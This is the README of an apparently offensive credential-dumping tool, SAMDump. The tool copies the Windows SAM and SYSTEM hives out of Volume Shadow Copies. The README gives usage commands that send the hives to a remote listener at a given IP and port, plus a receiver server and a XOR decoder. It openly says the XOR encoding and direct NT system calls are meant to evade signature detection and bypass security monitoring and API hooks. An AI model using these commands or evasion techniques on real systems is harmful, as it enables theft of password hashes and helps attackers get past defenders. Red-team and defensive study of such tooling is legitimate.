# SAMDump

Extract Windows SAM and SYSTEM files using Volume Shadow Copy Service (VSS) with multiple exfiltration options and XOR obfuscation.

- Lists volume shadow copies using VSS and creates one if necessary
- Extracts SAM and SYSTEM files from shadow copies
- Uses direct NT API calls for file operations
- Supports XOR encoding for obfuscation
- Multiple exfiltration methods: local save or network transfer


## Usage

*SAMDump.exe* is the main executable that uses Windows VSS to create shadow copies and extract credential files:

```
SAMDump.exe [OPTIONS]

Options:
  --save-local [BOOL]    Save locally (default: false)
  --output-dir DIR       Output directory (default: C:\Windows\tasks)
  --send-remote [BOOL]   Send remotely (default: false)
  --host IP              Host for remote sending (default: 127.0.0.1)
  --port PORT            Port for remote sending (default: 7777)
  --xor-encode [BOOL]    XOR Encode (default: false)
  --xor-key KEY          Enable XOR with specified key (default: SAMDump2025)
  --disk DISK            Disk for shadow copy (default: C:\)
  --help                 Show this help
```

Save locally without encoding:

```
SAMDump.exe --save-local --output-dir "C:\temp"
```

Save locally with XOR encoding:

```
SAMDump.exe --save-local --xor-encode --xor-key "SAMDump2025"
```

Send to remote server with XOR encoding:

```
SAMDump.exe --send-remote --host 192.168.1.100 --port 4444 --xor-encode
```


<br>

## Server to receive the files

*server.py* is a Python server that receives files over network with automatic XOR decoding and filename formatting:

```
python server.py [OPTIONS]

Options:
  --host HOST     IP address to listen on (default: 0.0.0.0)
  --port PORT     Port to listen on (default: 7777)
  --xor-key KEY   Key for XOR decoding (optional)
```

Listener on specific interface and port with XOR key:

```
python server.py --host 192.168.1.100 --port 4444 --xor-key "SAMDump2025"
```


<br>

## Script to decode the files

*xor-decoder.py* is a Python script to decode XOR-encoded SAM and SYSTEM files:

```
python xor-decoder.py [OPTIONS]

Options:
  --sam SAM         Path to encoded SAM file (required)
  --system SYSTEM   Path to encoded SYSTEM file (required)
  --xor-key KEY     XOR key for decoding (default: SAMDump2025)
  --output-dir DIR  Output directory for decoded files (default: ./decoded)
```

Decode with default key:

```
python xor-decoder.py --sam sam.txt --system system.txt
```

Decode with custom key and output directory:

```
python xor-decoder.py --sam sam.txt --system system.txt --xor-key "MyKey" --output-dir ./results
```

<br>

## Motivation

I wanted a tool to automate the process of SAM and SYSTEM dumping. 

This tool extracts the files without writing to the target filesystem when using remote transfer mode. 

XOR-encoding offers basic obfuscation to evade signature-based detection even when using remote mode.

It leverages direct NT API calls to bypass some security monitoring solutions and user-mode API hooks.


<br>

## NT API Integration

The tool employs direct NT system calls instead of standard Windows API functions which might bypass some user-mode API hooks commonly monitored:

- NtCreateFile/NtReadFile: To open a handle and read the bytes of the SAM and SYSTEM files in the Shadow Copy.

- NtWriteFile: To save the files locally.

- Direct memory manipulation: Custom GetProcAddress implementation to resolve function addresses without standard library calls using NtReadVirtualMemory.